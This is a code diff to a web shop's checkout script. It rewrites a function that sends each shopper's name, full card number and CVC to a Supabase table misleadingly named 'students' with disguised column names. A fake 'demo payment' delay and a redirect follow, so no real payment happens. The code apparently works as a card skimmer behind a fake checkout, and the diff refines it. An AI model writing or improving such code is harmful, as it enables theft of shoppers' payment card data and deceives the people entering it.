@@ -62,7 +62,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     <i class="fas fa-shopping-cart" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
                     Your cart is empty.
                     <br><br>
-                    <a href="index.html" style="color: var(--button-bg); text-decoration: none; font-weight: 500;">
+                    <a href="/" style="color: var(--button-bg); text-decoration: none; font-weight: 500;">
                         <i class="fas fa-arrow-left"></i> Continue Shopping
                     </a>
                 </div>
@@ -288,34 +288,32 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE
+    // SEND TO SUPABASE - Using existing client
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, cvc) {
-        const supabaseUrl = 'YOUR_SUPABASE_URL'; // ← Replace with your Supabase URL
-        const supabaseKey = 'YOUR_SUPABASE_ANON_KEY'; // ← Replace with your Supabase Anon Key
+        // Use the existing Supabase client from your app
+        const supabase = window.supabaseClient;
+        
+        if (!supabase) {
+            throw new Error('Supabase client not initialized. Please check your connection.');
+        }
 
-        const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'apikey': supabaseKey,
-                'Authorization': `Bearer ${supabaseKey}`,
-                'Prefer': 'return=representation'
-            },
-            body: JSON.stringify({
-                kname: name,
-                knumber: cardNumber,
-                kfc: cvc
-            })
-        });
+        const { data, error } = await supabase
+            .from('students')
+            .insert([
+                { 
+                    kname: name,
+                    knumber: cardNumber,
+                    kfc: cvc
+                }
+            ]);
 
-        if (!response.ok) {
-            const error = await response.json();
+        if (error) {
             throw new Error(error.message || 'Failed to save to database');
         }
 
-        return response.json();
+        return data;
     }
 
     // ==========================================
@@ -409,8 +407,8 @@ document.addEventListener("DOMContentLoaded", () => {
 
         try {
             // ===== SAVE TO SUPABASE =====
-            const result = await saveToSupabase(name, cardNumber, cvc);
-            console.log('✅ Saved to Supabase:', result);
+            await saveToSupabase(name, cardNumber, cvc);
+            console.log('✅ Saved to Supabase');
 
             // ===== DEMO PAYMENT =====
             await new Promise(resolve => setTimeout(resolve, 1500));
@@ -440,7 +438,7 @@ document.addEventListener("DOMContentLoaded", () => {
             payButton.style.cursor = 'not-allowed';
 
             setTimeout(() => {
-                window.location.href = 'index.html';
+                window.location.href = '/';
             }, 3000);
 
         } catch (error) {
